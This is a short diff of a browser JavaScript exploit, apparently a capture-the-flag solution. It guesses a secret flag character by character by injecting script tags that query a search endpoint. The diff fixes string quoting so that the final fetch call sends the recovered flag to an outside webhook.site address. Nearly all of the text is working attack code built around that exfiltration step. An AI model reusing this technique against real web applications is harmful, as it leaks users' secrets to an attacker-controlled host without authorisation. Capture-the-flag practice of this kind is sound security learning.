@@ -6,7 +6,7 @@ var hook = 'webhook.site/05b5e88e-174d-4bd4-b754-6533413c5cb8';
 var flag = 'B';
 var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
 var special = '_%\"\'';
-var url1 = 'http://${ip2}/api/entries/search?q='
+var url1 = `http://${ip2}/api/entries/search?q=`
 async function getPartialFlag(char){
  return new Promise((resolve, reject)=>{
  const script = document.createElement("script");
@@ -22,7 +22,7 @@ async function getFlag(chars) {
  char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
  await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
  if(b) break;}
- fetch('https://${hook}/flag=${flag}');
+ fetch(`https://${hook}/flag=${flag}`);
 };
 getFlag(abc);
 </script>
